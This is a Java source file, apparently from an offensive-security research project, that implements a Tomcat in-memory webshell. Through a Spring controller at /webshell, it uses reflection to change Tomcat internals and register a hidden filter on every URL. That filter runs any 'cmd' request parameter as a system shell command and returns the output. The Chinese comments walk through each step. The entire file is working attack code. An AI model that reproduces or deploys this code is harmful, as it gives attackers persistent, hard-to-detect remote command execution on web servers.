package com.firebasky.echo.controller.webshell;

import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;

/**
 * 先访问两次webshell路由（第一次请求修改属性，第二次得到request注册filter）
 * 然后带上cmd参数访问任意url即可
 * shiro不成功。。。
 */

@RestController
public class tomcat {
    @RequestMapping("/webshell")
    public String tomcat() {
        try{
            //获取各字段
            java.lang.reflect.Field WRAP_SAME_OBJECT=Class.forName("org.apache.catalina.core.ApplicationDispatcher").getDeclaredField("WRAP_SAME_OBJECT");
            Class applicationFilterChain = Class.forName("org.apache.catalina.core.ApplicationFilterChain");
            java.lang.reflect.Field lastServicedRequest = applicationFilterChain.getDeclaredField("lastServicedRequest");
            java.lang.reflect.Field lastServicedResponse = applicationFilterChain.getDeclaredField("lastServicedResponse");

            //去掉final修饰符
            java.lang.reflect.Field modifiers = java.lang.reflect.Field.class.getDeclaredField("modifiers");
            modifiers.setAccessible(true);
            modifiers.setInt(WRAP_SAME_OBJECT, WRAP_SAME_OBJECT.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            modifiers.setInt(lastServicedRequest, lastServicedRequest.getModifiers() & ~java.lang.reflect.Modifier.FINAL);
            modifiers.setInt(lastServicedResponse, lastServicedResponse.getModifiers() & ~java.lang.reflect.Modifier.FINAL);

            //设置允许访问
            WRAP_SAME_OBJECT.setAccessible(true);
            lastServicedRequest.setAccessible(true);
            lastServicedResponse.setAccessible(true);

            //如果是第一次请求，则修改各字段，否则获取cmd参数执行命令并返回结果
            if(!WRAP_SAME_OBJECT.getBoolean(null)){
                WRAP_SAME_OBJECT.setBoolean(null,true);
                lastServicedRequest.set(null,new ThreadLocal());
                lastServicedResponse.set(null,new ThreadLocal());
            }else{
                ThreadLocal<javax.servlet.ServletRequest> threadLocalRequest = (ThreadLocal<javax.servlet.ServletRequest>) lastServicedRequest.get(null);
                javax.servlet.ServletRequest request = threadLocalRequest.get();

                try {
                    javax.servlet.ServletContext servletContext=request.getServletContext();

                    //判断是否已有该名字的filter，有则不再添加
                    if (servletContext.getFilterRegistration("webShell") == null) {

                        class WebShell implements javax.servlet.Filter{

                            public void doFilter(javax.servlet.ServletRequest request, javax.servlet.ServletResponse response, javax.servlet.FilterChain chain) throws java.io.IOException, javax.servlet.ServletException {
                                System.out.println("filter");
                                String cmd=request.getParameter("cmd");

                                if(cmd!=null) {
                                    String[] cmds = null;

                                    if (System.getProperty("os.name").toLowerCase().contains("win")) {
                                        cmds = new String[]{"cmd.exe", "/c", cmd};
                                    } else {
                                        cmds = new String[]{"sh", "-c", cmd};
                                    }

                                    java.io.InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                                    java.util.Scanner s = new java.util.Scanner(in).useDelimiter("\\a");
                                    String output = s.hasNext() ? s.next() : "";
                                    java.io.Writer writer = response.getWriter();
                                    writer.write(output);
                                    writer.flush();
                                    writer.close();
                                }

                                chain.doFilter(request, response);
                            }
                        }

                        //因为门面模式的使用，此处servletContext实际是ApplicationContextFacade，需要提取ApplicationContext
                        java.lang.reflect.Field contextField=servletContext.getClass().getDeclaredField("context");
                        contextField.setAccessible(true);
                        org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(servletContext);

                        //获取ApplicationContext中的StandardContext
                        contextField=applicationContext.getClass().getDeclaredField("context");
                        contextField.setAccessible(true);
                        org.apache.catalina.core.StandardContext standardContext= (org.apache.catalina.core.StandardContext) contextField.get(applicationContext);

                        //修改state
                        java.lang.reflect.Field stateField=org.apache.catalina.util.LifecycleBase.class.getDeclaredField("state");
                        stateField.setAccessible(true);
                        stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTING_PREP);

                        //注册filter
                        javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext.addFilter("webShell", new WebShell());
                        filterRegistration.addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,new String[]{"/*"});

                        //添加到filterConfigs
                        java.lang.reflect.Method filterStartMethod = org.apache.catalina.core.StandardContext.class.getMethod("filterStart");
                        filterStartMethod.setAccessible(true);
                        filterStartMethod.invoke(standardContext, null);

                        //调整filter位置
                        org.apache.tomcat.util.descriptor.web.FilterMap[] filterMaps = standardContext.findFilterMaps();
                        for (int i = 0; i < filterMaps.length; i++) {
                            if (filterMaps[i].getFilterName().equalsIgnoreCase("webShell")) {
                                org.apache.tomcat.util.descriptor.web.FilterMap filterMap = filterMaps[i];
                                filterMaps[i] = filterMaps[0];
                                filterMaps[0] = filterMap;
                                break;
                            }
                        }

                        //恢复成LifecycleState.STARTE，否则会造成服务不可用
                        stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);

                    }

                }catch (Exception e){
                    e.printStackTrace();
                }

            }

        }catch (Exception e){
            e.printStackTrace();
        }

        return "test";
    }
}